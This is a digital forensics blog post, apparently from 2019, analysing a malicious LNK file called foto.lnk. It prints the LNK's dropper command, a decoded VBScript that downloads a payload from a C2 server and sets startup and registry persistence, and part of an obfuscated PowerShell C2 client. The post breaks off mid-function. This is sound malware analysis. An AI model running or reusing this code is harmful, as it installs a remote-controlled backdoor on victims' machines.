@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>
+        &#34;Say Cheese!&#34; An analysis of foto.lnk - bit_of_hex
+      </title>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  
+  <meta name="theme-color" content="#000000" />
+  
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <meta name="description" content="In Australia, a platypus is colloquially called the &amp;lsquo;spare parts animal&amp;rsquo;. It&amp;rsquo;s an egg-laying mammal, with a duck bill, beaver tail and webbed feet. It&amp;rsquo;s perfectly adapted to its environment despite looking like a Frankenstien of the animal world.
+What does this have to do with a malicious LNK file? Well, apart from the fact I like platypuses (or is it platypi?), malware using LNK files stitch together the world between the attacker and the victim." />
+  <meta name="generator" content="Hugo 0.68.3 with theme pure" />
+  <title>&#34;Say Cheese!&#34; An analysis of foto.lnk - bit_of_hex</title>
+  
+  
+  <link rel="stylesheet" href="https://mattnotmax.github.io/css/style.min.c4bc7071f132c964c2116bca53b392933f377e5ca7b7051ed245187c621a2d3e.css">
+  
+  <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+  <meta property="og:title" content="&#34;Say Cheese!&#34; An analysis of foto.lnk" />
+<meta property="og:description" content="In Australia, a platypus is colloquially called the &lsquo;spare parts animal&rsquo;. It&rsquo;s an egg-laying mammal, with a duck bill, beaver tail and webbed feet. It&rsquo;s perfectly adapted to its environment despite looking like a Frankenstien of the animal world.
+What does this have to do with a malicious LNK file? Well, apart from the fact I like platypuses (or is it platypi?), malware using LNK files stitch together the world between the attacker and the victim." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mattnotmax.github.io/2019/11/say-cheese-an-analysis-of-foto-lnk/" />
+<meta property="article:published_time" content="2019-11-16T16:46:26+00:00" />
+<meta property="article:modified_time" content="2019-11-16T16:46:26+00:00" />
+<meta itemprop="name" content="&#34;Say Cheese!&#34; An analysis of foto.lnk">
+<meta itemprop="description" content="In Australia, a platypus is colloquially called the &lsquo;spare parts animal&rsquo;. It&rsquo;s an egg-laying mammal, with a duck bill, beaver tail and webbed feet. It&rsquo;s perfectly adapted to its environment despite looking like a Frankenstien of the animal world.
+What does this have to do with a malicious LNK file? Well, apart from the fact I like platypuses (or is it platypi?), malware using LNK files stitch together the world between the attacker and the victim.">
+<meta itemprop="datePublished" content="2019-11-16T16:46:26&#43;00:00" />
+<meta itemprop="dateModified" content="2019-11-16T16:46:26&#43;00:00" />
+<meta itemprop="wordCount" content="2043">
+
+
+
+<meta itemprop="keywords" content="cyberchef,malware,lnk files," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="&#34;Say Cheese!&#34; An analysis of foto.lnk"/>
+<meta name="twitter:description" content="In Australia, a platypus is colloquially called the &lsquo;spare parts animal&rsquo;. It&rsquo;s an egg-laying mammal, with a duck bill, beaver tail and webbed feet. It&rsquo;s perfectly adapted to its environment despite looking like a Frankenstien of the animal world.
+What does this have to do with a malicious LNK file? Well, apart from the fact I like platypuses (or is it platypi?), malware using LNK files stitch together the world between the attacker and the victim."/>
+
+  <!--[if lte IE 9]>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+    <![endif]-->
+
+  <!--[if lt IE 9]>
+      <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="https://twitter.com/mattnotmax" target="_blank">
+            <img class="img-circle img-rotate" src="https://mattnotmax.github.io/logo.png" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">bit_of_hex</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">digital forensics | incident response</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Melbourne, Australia</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      
+<div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://mattnotmax.github.io/2020/02/sapphire-mushroom-lnk-files/" class="title">Suspected Sapphire Mushroom (APT-C-12) malicious LNK files</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-02-09 23:54:19 &#43;0000 UTC" itemprop="datePublished">2020-02-09</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://mattnotmax.github.io/2019/11/say-cheese-an-analysis-of-foto-lnk/" class="title">&#34;Say Cheese!&#34; An analysis of foto.lnk</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2019-11-16 16:46:26 &#43;0000 UTC" itemprop="datePublished">2019-11-16</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://mattnotmax.github.io/2019/07/deriving-intelligence-from-lnk-files/" class="title">Deriving intelligence from LNK files</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2019-07-15 02:14:48 &#43;0000 UTC" itemprop="datePublished">2019-07-15</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://mattnotmax.github.io/2019/02/base64-encoded-signatures/" class="title">Base64 Encoded File Signatures</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2019-02-19 00:06:06 &#43;0000 UTC" itemprop="datePublished">2019-02-19</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://mattnotmax.github.io/2019/01/attack-and-singapore-breach/" class="title">ATT&amp;CKing the Singapore Health Data Breach</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2019-01-12 17:53:26 &#43;0000 UTC" itemprop="datePublished">2019-01-12</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Catalogue</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-say-cheese-an-analysis-of-foto-lnk" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/2019/11/say-cheese-an-analysis-of-foto-lnk/"
+    >&#34;Say Cheese!&#34; An analysis of foto.lnk</a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://mattnotmax.github.io/2019/11/say-cheese-an-analysis-of-foto-lnk/" class="article-date">
+  <time datetime="2019-11-16 16:46:26 &#43;0000 UTC" itemprop="datePublished">2019-11-16</time>
+</a>
+</span>
+  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/cyberchef/"> cyberchef </a>
+    <a class="article-tag-link" href="/tags/malware/"> malware </a>
+    <a class="article-tag-link" href="/tags/lnk-files/"> lnk files </a>
+  </span>
+
+        <span class="post-comment"><i class="icon icon-comment"></i>&nbsp;<a href="/2019/11/say-cheese-an-analysis-of-foto-lnk/#comments"
+            class="article-comment-link">Comments</a></span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <p>In Australia, a platypus is colloquially called the &lsquo;spare parts animal&rsquo;. It&rsquo;s an egg-laying mammal, with a duck bill, beaver tail and webbed feet. It&rsquo;s perfectly adapted to its environment despite looking like a Frankenstien of the animal world.</p>
+<p>What does this have to do with a malicious LNK file? Well, apart from the fact I like platypuses (or is it platypi?), malware using LNK files stitch together the world between the attacker and the victim. These &lsquo;toolmarks&rsquo; have been written by <a href="https://bitofhex.com/2019/07/15/deriving-intelligence-from-lnk-files/">myself</a> and more extensively <a href="http://windowsir.blogspot.com/">here</a>. So that&rsquo;s why I keep coming back to looking at them.</p>
+<p>Additionally, this random sample from Hybrid-Analysis, <code>foto.lnk</code>, is also a bit of a Frankenstien of a malware: stitched together with various components that we shall examine. It&rsquo;s not a ground-breaking, born of an APT <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>, or ingenious. But still is interesting to deconstruct. So, without wasting any more time on Australian monotremes, let&rsquo;s dive in an take a look!</p>
+<h2 id="fotolnk">Foto.lnk</h2>
+<p>The file, <code>foto.lnk</code> (SHA256: D28C1C4F4C705B21E84ADADB42594E42543DF4F1C4B44219569DC18B375E78E3) appears as a normal LNK file. Of course, the target executes PowerShell via <code>cmd.exe</code> rather than launch a program:</p>
+<div style="width: 50%; height: 50%; display: block; margin: 0 auto;" ><img src="/2019/11/2.PNG" alt="LNK File" style="border: #000000 1px outset"></div>
+<p>The full code executed is as follows:</p>
+<pre><code class="xml">C:\Windows\System32\cmd.exe /c start "" explorer "%cd%\Foto" | powershell -NonInteractive -noLogo -c "& {get-content %cd%\Foto.lnk | select -Last 1 > %appdata%\_.vbe}" && start "" wscript //B "%appdata%\_.vbe"
+</code></pre>
+<p>This command will execute PowerShell <code>Get-Content</code> to write the last line of the LNK file to another file: <code>C:\Users\&lt;account&gt;\AppData\Roaming\_.vbe</code>. In this case, the LNK file (perhaps we should now say Frankenlnk?) is carrying the second payload: an encoded Visual Basic file. Shifting to the end of the file where the PowerShell is copying data from, the encoded contents can be seen starting with <code>#@~</code> and ending with <code>^#~@</code>.</p>
+<div style="width: 50%; height: 50%; display: block; margin: 0 auto;" ><img src="/2019/11/3.PNG" alt="Encoded Payload" style="border: #000000 1px outset"></div>
+<h2 id="_vbe">_.VBE</h2>
+<p>VBE files are a legitimate way for developers to obfuscate their scripts to protect their intellectual property. See <a href="https://medium.com/@bromiley/malware-monday-vbscript-and-vbe-files-292252c1a16">here</a> for a great run-down on VBE malware. Using <a href="https://github.com/DidierStevens/DidierStevensSuite">Didier Stevens</a>&rsquo; tool <code>decode-vbe.py</code> the obfuscated output becomes:</p>
+<pre><code class="xml">function DF353449CC6DEB35002E2EC(BBFD5FC89F398A9E08E6734)
+for AC3DC0C68330AD3CCBCC207 = 1 to len(BBFD5FC89F398A9E08E6734)  Step 2
+DF353449CC6DEB35002E2EC = DF353449CC6DEB35002E2EC & Chr(int("&H"&mid(BBFD5FC89F398A9E08E6734,AC3DC0C68330AD3CCBCC207,2)))
+next
+End Function
+On Error Resume Next
+Set CCF1828B74279597728A = CreateObject(DF353449CC6DEB35002E2EC("577363726970742E5368656C6C"))
+Set FE60A4152AFF46A3BE9403F=CreateObject(DF353449CC6DEB35002E2EC("536372697074696E672E46696C6553797374656D4F626A656374"))
+CB2DFC0272FBAFE74128D43 = DF353449CC6DEB35002E2EC("636C69656E74")
+BBB6B994ABBEC7719177C4A = DF353449CC6DEB35002E2EC("636C69656E742E707331")
+FBD652DA231F93648EE5FF1 = CCF1828B74279597728A.ExpandEnvironmentStrings(DF353449CC6DEB35002E2EC("257573657270726F66")&DF353449CC6DEB35002E2EC("696C6525"))&DF353449CC6DEB35002E2EC("5C417070446174615C526F616D696E675C4D6963726F736F66745C57696E646F77735C5374617274204D656E755C50726F6772616D735C537461727475705C2E6C6E6B")
+FF2CF9DFB02A68243C7A007 = CCF1828B74279597728A.ExpandEnvironmentStrings(DF353449CC6DEB35002E2EC("25757365")&DF353449CC6DEB35002E2EC("7270726F66696C6525") & DF353449CC6DEB35002E2EC("5C53595354454D"))
+EEF7DC408D6E68E06D9C2F9 = DF353449CC6DEB35002E2EC("68747470733A2F2F7A777169702E6D6C2F3435373137")
+AF954113B32AED10916E1A7 = chr(34)
+BF478F231C1E9460F79BB4E = DF353449CC6DEB35002E2EC("706F7765727368656C6C202D6E6F4C6F676F202D4E6F6E496E746572616374697665202D6320")&AF954113B32AED10916E1A7&DF353449CC6DEB35002E2EC("267B284E65772D4F626A656374204E65742E576562436C69656E74292E446F776E6C6F616446696C652827") & EEF7DC408D6E68E06D9C2F9 & DF353449CC6DEB35002E2EC("272C24656E763A7573657270726F66696C652B275C") & CB2DFC0272FBAFE74128D43 & DF353449CC6DEB35002E2EC("27293B7D")&AF954113B32AED10916E1A7
+ABF02819764175C48EFC73A = DF353449CC6DEB35002E2EC("657870616E6420")&AF954113B32AED10916E1A7&DF353449CC6DEB35002E2EC("25757365727072")&DF353449CC6DEB35002E2EC("6F66696C65255C")& CB2DFC0272FBAFE74128D43 &AF954113B32AED10916E1A7&DF353449CC6DEB35002E2EC("20")&AF954113B32AED10916E1A7&DF353449CC6DEB35002E2EC("25757365727072")&DF353449CC6DEB35002E2EC("6F66696C65255C")&BBB6B994ABBEC7719177C4A&AF954113B32AED10916E1A7
+FD9EEE6B396C96EF57FA0D8 = DF353449CC6DEB35002E2EC("706F7765727368656C6C202D6E6F4C6F676F202D4E6F6E496E746572616374697665202D457865637574696F6E506F6C6963792042797061737320202D6320")&AF954113B32AED10916E1A7&DF353449CC6DEB35002E2EC("696E766F6B652D65787072657373696F6E2024656E763A7573657270726F66696C65275C")&BBB6B994ABBEC7719177C4A&DF353449CC6DEB35002E2EC("27")&AF954113B32AED10916E1A7
+BDE45D751DE0BB087449910 = DF353449CC6DEB35002E2EC("617474726962202B68202B73202B7220")&AF954113B32AED10916E1A7&CCF1828B74279597728A.ExpandEnvironmentStrings(DF353449CC6DEB35002E2EC("257573657270")&DF353449CC6DEB35002E2EC("726F66696C6525"))&DF353449CC6DEB35002E2EC("5C")&BBB6B994ABBEC7719177C4A&AF954113B32AED10916E1A7
+BC5AFC96DE5641F3DF61FB9 = DF353449CC6DEB35002E2EC("636D64202F632064656C202F66202F7320")&AF954113B32AED10916E1A7&CCF1828B74279597728A.ExpandEnvironmentStrings(DF353449CC6DEB35002E2EC("257573657270726F66")&DF353449CC6DEB35002E2EC("696C6525")) & DF353449CC6DEB35002E2EC("5C")&CB2DFC0272FBAFE74128D43&AF954113B32AED10916E1A7
+CCF1828B74279597728A.Run BF478F231C1E9460F79BB4E,0,True
+CCF1828B74279597728A.Run ABF02819764175C48EFC73A,0,True
+CCF1828B74279597728A.Run BDE45D751DE0BB087449910,0,True
+CCF1828B74279597728A.Run BC5AFC96DE5641F3DF61FB9,0
+AA2B5C8CB1A3A5A94A986C2 = FF2CF9DFB02A68243C7A007
+Set AF0D10F083F00C234B4F60A = FE60A4152AFF46A3BE9403F.CreateTextFile(AA2B5C8CB1A3A5A94A986C2,True)
+AF0D10F083F00C234B4F60A.Write DF353449CC6DEB35002E2EC("44696D207368656C6C2C636F6D6D616E64") & vbCrLf
+AF0D10F083F00C234B4F60A.Write DF353449CC6DEB35002E2EC("536574207368656C6C203D204372656174654F626A65637428")&AF954113B32AED10916E1A7&DF353449CC6DEB35002E2EC("577363726970742E5368656C6C")&AF954113B32AED10916E1A7&DF353449CC6DEB35002E2EC("29") & vbCrLf
+AF0D10F083F00C234B4F60A.Write DF353449CC6DEB35002E2EC("636F6D6D616E64203D20")&AF954113B32AED10916E1A7&DF353449CC6DEB35002E2EC("706F7765727368656C6C202D6E6F4C6F676F202D4E6F6E496E746572616374697665202D457865637574696F6E506F6C6963792042797061737320202D6320")&AF954113B32AED10916E1A7&AF954113B32AED10916E1A7&DF353449CC6DEB35002E2EC("696E766F6B652D65787072657373696F6E2024656E763A7573657270726F66696C65275C") & BBB6B994ABBEC7719177C4A & DF353449CC6DEB35002E2EC("27")&AF954113B32AED10916E1A7&AF954113B32AED10916E1A7&AF954113B32AED10916E1A7&vbCrLf
+AF0D10F083F00C234B4F60A.Write DF353449CC6DEB35002E2EC("7368656C6C2E52756E20636F6D6D616E642C30")
+AF0D10F083F00C234B4F60A.Close
+Set AF0D10F083F00C234B4F60A = Nothing
+Set AF0D10F083F00C234B4F60A = FE60A4152AFF46A3BE9403F.GetFile(AA2B5C8CB1A3A5A94A986C2)
+AF0D10F083F00C234B4F60A.Attributes = 7
+Set AF0D10F083F00C234B4F60A = Nothing
+Set BA06C14AA13C53E7C9AF076 = CCF1828B74279597728A.CreateShortcut(FBD652DA231F93648EE5FF1)
+BA06C14AA13C53E7C9AF076.TargetPath = CCF1828B74279597728A.ExpandEnvironmentStrings(DF353449CC6DEB35002E2EC("257379737465")&DF353449CC6DEB35002E2EC("6D647269766525")) &  DF353449CC6DEB35002E2EC("5C57696E646F77735C53797374656D33325C636D642E657865")
+BA06C14AA13C53E7C9AF076.Arguments = DF353449CC6DEB35002E2EC("2F632077736372697074202F2F42202F2F453A76627320257573")&DF353449CC6DEB35002E2EC("657270726F66696C65255C53595354454D")
+BA06C14AA13C53E7C9AF076.IconLocation = CCF1828B74279597728A.ExpandEnvironmentStrings(DF353449CC6DEB35002E2EC("2573797374656D64")&DF353449CC6DEB35002E2EC("7269766525")) & DF353449CC6DEB35002E2EC("5C57696E646F77735C53797374656D33325C5368656C6C33322E646C6C2C34")
+BA06C14AA13C53E7C9AF076.WindowStyle = DF353449CC6DEB35002E2EC("37")
+BA06C14AA13C53E7C9AF076.WorkingDirectory = DF353449CC6DEB35002E2EC("2543")&DF353449CC6DEB35002E2EC("4425")
+BA06C14AA13C53E7C9AF076.Save
+Set BA06C14AA13C53E7C9AF076 = Nothing
+Set CB7D9146496BF22F697EB8F = FE60A4152AFF46A3BE9403F.GetFile(FBD652DA231F93648EE5FF1)
+CB7D9146496BF22F697EB8F.Attributes = 6
+Set CB7D9146496BF22F697EB8F = Nothing
+CCF1828B74279597728A.RegWrite DF353449CC6DEB35002E2EC("484B43555C536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E5C"),AF954113B32AED10916E1A7&FBD652DA231F93648EE5FF1&AF954113B32AED10916E1A7,DF353449CC6DEB35002E2EC("5245475F535A")
+CCF1828B74279597728A.Run FD9EEE6B396C96EF57FA0D8,0
+</code></pre>
+<p>Ugh.</p>
+<p>For someone like me who doesn&rsquo;t know a whole lot of Visual Basic this looks painful. But&hellip;looking at the code I can see hexadecimal values in the quotes. It would be remiss of a blog called &lsquo;bit_of_hex&rsquo; not to extract those and see what they are. Of course, <a href="https://gchq.github.io/CyberChef/">CyberChef</a> to the rescue:</p>
+<pre><code class="xml">Regular_expression('User defined','\\(".*?"\\)',true,false,false,false,false,false,'List matches')
+Find_/_Replace({'option':'Simple string','string':'("'},'',true,false,true,false)
+Find_/_Replace({'option':'Simple string','string':'")'},'',true,false,true,false)
+Fork('\\n','\\n',false)
+From_Hex('Auto')
+</code></pre>
+<p>The power of this CyberChef recipe is the regular expression <code>\(&quot;.*?&quot;\)</code>. This will extract everything in bracketed quotes to the first end quote/bracket. Using the CyberChef &lsquo;highlight regex&rsquo; function the result can be previewed before committing:</p>
+<div style="width: 100%; height: 100%; display: block; margin: 0 auto;" ><img src="/2019/11/4.PNG" alt="CyberChef" style="border: #000000 1px outset"></div>
+<p>From there, it&rsquo;s a simple find/replace, and convert from hexadecimal to get the following output of strings:</p>
+<pre><code class="xml">Wscript.Shell
+Scripting.FileSystemObject
+client
+client.ps1
+%userprof
+ile%
+\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\.lnk
+%use
+rprofile%
+\SYSTEM
+hxxps://zwqip.ml/45717
+powershell -noLogo -NonInteractive -c 
+&{(New-Object Net.WebClient).DownloadFile('
+',$env:userprofile+'\
+');}
+expand 
+%userpr
+ofile%\
+ 
+%userpr
+ofile%\
+powershell -noLogo -NonInteractive -ExecutionPolicy Bypass  -c 
+invoke-expression $env:userprofile'\
+'
+attrib +h +s +r 
+%userp
+rofile%
+\
+cmd /c del /f /s 
+%userprof
+ile%
+\
+Dim shell,command
+Set shell = CreateObject(
+Wscript.Shell
+)
+command = 
+powershell -noLogo -NonInteractive -ExecutionPolicy Bypass  -c 
+invoke-expression $env:userprofile'\
+'
+shell.Run command,0
+%syste
+mdrive%
+\Windows\System32\cmd.exe
+/c wscript //B //E:vbs %us
+erprofile%\SYSTEM
+%systemd
+rive%
+\Windows\System32\Shell32.dll,4
+7
+%C
+D%
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\
+REG_SZ
+</code></pre>
+<p>While this is simply a list of strings, we can infer the gist of the VBS script without doing much further:</p>
+<ul>
+<li>download from <code>hxxps://zwqip.ml/45717</code>;</li>
+<li>reference to a file: <code>client.ps1</code>;</li>
+<li>changes to file attributes;</li>
+<li>delete file(s);</li>
+<li>call another file, <code>SYSTEM</code>; and</li>
+<li>modification or reading of the <code>CurrentVersion\Run\</code> registry key, and the folder <code>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</code>, both common persistence locations.</li>
+</ul>
+<h2 id="clientps1">client.ps1</h2>
+<p>The C2, <code>hxxps://zwqip.ml/45717</code>, was not functioning by the time I got to this sample. However, looking at <code>client.ps1</code> (SHA256: 3FA019CEC8B4FF90344C595494F5CBA0E5915210C0E8B175C452566C1034B680) from Hybrid-Analysis reveals the following:</p>
+<pre><code class="xml">$global:lo1l1l1l1o1o1lo = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLldlYi5FeHRlbnNpb25z"))
+[System.Reflection.Assembly]::LoadWithPartialName($global:lo1l1l1l1o1o1lo)|out-null
+$global:lo1o1olo1l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly96cnV3b2RyZWUuZ3E"))
+$global:oolo1olo1l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzQyLjAuMjMxMS4xMDUgU2FmYXJpLzUzNy4zNiBFZGdlLzEyLjI0Ng=="))
+$global:l1l1l1l1ll1l1l0l1l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WC1SZWc="))
+$global:l01l0l111ll10l = $null
+$global:l000l1l0l0l = $null
+$global:l10ll0ll00 = $null
+$global:ool0l00l1l0 = $null
+$global:l0l1l0l0olol = 0
+$global:l0100ll10ll0 = 30
+$global:l0l1l0l1l = $null
+$global:o1l0lol10ol0 = 20
+$global:ll1ool1oll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29va2ll"))
+$global:ll1oooll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0LUNvb2tpZQ=="))
+$global:ll1oo11oll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UE9TVA=="))
+$global:lloo1ll1loooll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R0VU"))
+$global:llolol1l1loooll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRlZA=="))
+$global:llo0l1loooll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y29tbWFuZA=="))
+$global:llo0l1loll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dGFza0lk"))
+$global:llo0l1loll1l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dHlwZQ=="))
+$global:llo0l0lloll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("I3dhaXQ="))
+$global:l1o0l1loll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bmV3IHRpbWVvdXQ6"))
+
+#Functions
+function MakeRequest{
+    param ($_type)
+    process {
+        $l1ool0ol1oo0l1o0l = [System.Net.HttpWebRequest]::Create($lo1o1olo1l)
+        $l1ool0ol1oo0l1o0l.UserAgent = $global:oolo1olo1l
+        
+        switch($_type){
+            "l10lll101l0l"{
+                if($global:l01l0l111ll10l -ne $null){
+                    ;break
+                }
+
+                $l1ool0ol1oo0l1o0l.Headers.Add($global:l1l1l1l1ll1l1l0l1l,$global:l0l1l0l1l)
+                $l1ool0ol1oo0l1o0l.Method = $global:ll1oo11oll1
+                $ll1ool0lollo1l = [System.Net.HttpWebResponse] $l1ool0ol1oo0l1o0l.GetResponse()
+
+                   if($ll1ool0lollo1l.StatusDescription -eq $global:llolol1l1loooll1){
+                        $global:l01l0l111ll10l =  $ll1ool0lollo1l.Headers[$global:ll1oooll1];
+                   }
+
+                ;break
+            }
+            "l10l11l1l000l1ll10"{
+                $l1ool0ol1oo0l1o0l.Method = $global:lloo1ll1loooll1
+                $l1ool0ol1oo0l1o0l.Headers.Add($global:ll1ool1oll1,$global:l01l0l111ll10l)
+                try {
+                $ll1ool0lollo1l = [System.Net.HttpWebResponse] $l1ool0ol1oo0l1o0l.GetResponse()
+                $responseStream = [System.IO.Stream]$ll1ool0lollo1l.GetResponseStream()
+                $reader = New-Object System.IO.StreamReader($responseStream,[System.Text.Encoding]::UTF8)
+                $global:l10ll0ll00 =  $reader.ReadToEnd()
+                $reader = $null
+                $responseStream = $null
+                $ll1ool0lollo1l = $null
+
+                $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
+                $obj = $ser.DeserializeObject($global:l10ll0ll00)
+                $ser = $null
+                $global:l000l1l0l0l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($obj[$global:llo0l1loooll1])).trim()
+                $global:l0l1l0l0olol = $obj[$global:llo0l1loll1]
+                $obj = $null
+                }
+                catch{
+                $global:l000l1l0l0l = $null
+                $global:l10ll0ll00 = $null
+                }
+
+                ;break
+            }
+            "ol11ool1llool1llol"{
+
+                if ($global:ool0l00l1l0 -eq $null){
+                    ;break
+                }
+                Start-Sleep -Seconds 5 
+
+                $l1ool0ol1oo0l1o0l.Headers.Add($global:ll1ool1oll1,$global:l01l0l111ll10l + ";"+$global:llo0l1loll1+"="+$global:l0l1l0l0olol)
+                
+                $l1ool0ol1oo0l1o0l.Method = $global:ll1oo11oll1
+
+                $ll1oolllolo += $global:ool0l00l1l0
+                $ll1oolllolo += "`n`r"
+                $global:ool0l00l1l0 = $null
+                $global:l000l1l0l0l = $null
+
+                $l1ol = [System.Text.Encoding]::UTF8.GetBytes($ll1oolllolo)
+                $ll1oolllolo = $null
+                $l1oll1ol = $l1ool0ol1oo0l1o0l.GetRequestStream()
+                $l1oll1ol.write($l1ol,0,$l1ol.Length)
+                $l1ol = $null
+
+                $l1oll1ol.flush()
+                $l1oll1ol.close()
+
+                $ll1ool0lollo1l = [System.Net.HttpWebResponse] $l1ool0ol1oo0l1o0l.GetResponse() 
+                $ll1ool0lollo1l = $null
+
+                ;break
+            }    
